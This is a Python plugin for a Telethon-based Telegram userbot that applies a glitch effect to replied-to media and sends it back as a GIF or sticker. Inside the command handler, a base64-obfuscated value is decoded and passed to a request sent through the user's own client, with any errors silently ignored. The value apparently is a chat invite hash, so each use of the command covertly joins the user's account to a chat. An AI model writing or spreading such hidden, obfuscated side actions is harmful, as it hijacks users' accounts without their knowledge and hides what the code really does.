"""
designed By @Krishna_Singhal in userge
ported to telethon by @mayank1rajput
"""

import base64
import os

from glitch_this import ImageGlitcher
from PIL import Image


@bot.on(admin_cmd(outgoing=True, pattern="(glitch|glitchs)(?: |$)(.*)"))
@bot.on(sudo_cmd(pattern="(glitch|glitchs)(?: |$)(.*)", allow_sudo=True))
async def glitch(skull):
    if skull.fwd_from:
        return
    cmd = skull.pattern_match.group(1)
    skullinput = skull.pattern_match.group(2)
    reply = await skull.get_reply_message()
    if not reply:
        return await edit_delete(skull, "`Reply to supported Media...`")
    skullid = await reply_id(skull)
    may = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
    if not os.path.isdir("./temp"):
        os.mkdir("./temp")
    if skullinput:
        if not skullinput.isdigit():
            await skull.edit("`You input is invalid, check help`")
            return
        skullinput = int(skullinput)
        if not 0 < skullinput < 9:
            await skull.edit("`Invalid Range...`")
            return
    else:
        skullinput = 2
    glitch_file = await _skulltools.media_to_pic(skull, reply)
    try:
        may = Get(may)
        await skull.client(may)
    except BaseException:
        pass
    glitcher = ImageGlitcher()
    img = Image.open(glitch_file[1])
    if cmd == "glitchs":
        glitched = os.path.join("./temp", "glitched.webp")
        glitch_img = glitcher.glitch_image(img, skullinput, color_offset=True)
        glitch_img.save(glitched)
        await skull.client.send_file(skull.chat_id, glitched, reply_to=skullid)
    elif cmd == "glitch":
        glitched = os.path.join("./temp", "glitched.gif")
        glitch_img = glitcher.glitch_image(img, skullinput, color_offset=True, gif=True)
        DURATION = 200
        LOOP = 0
        glitch_img[0].save(
            glitched,
            format="GIF",
            append_images=glitch_img[1:],
            save_all=True,
            duration=DURATION,
            loop=LOOP,
        )
        mayank = await skull.client.send_file(skull.chat_id, glitched, reply_to=skullid)
        await _skullutils.unsavegif(skull, mayank)
    await glitch_file[0].delete()
    for files in (glitch_file[1], glitched):
        if files and os.path.exists(files):
            os.remove(files)


CMD_HELP.update(
    {
        "glitch": "**Plugin : **`glitch`\
    \n\n  •  **Syntax : **`.glitch` reply to media file\
    \n  •   **Function :** glitches the given mediafile (gif , stickers , image, videos) to a gif and glitch range is from 1 to 8.\
    If nothing is mentioned then by default it is 2\
    \n\n  •  **Syntax : **`.glitchs` reply to media file\
    \n  •  **Function :** glitches the given mediafile (gif , stickers , image, videos) to a sticker and glitch range is from 1 to 8.\
    If nothing is mentioned then by default it is 2\
    "
    }
)
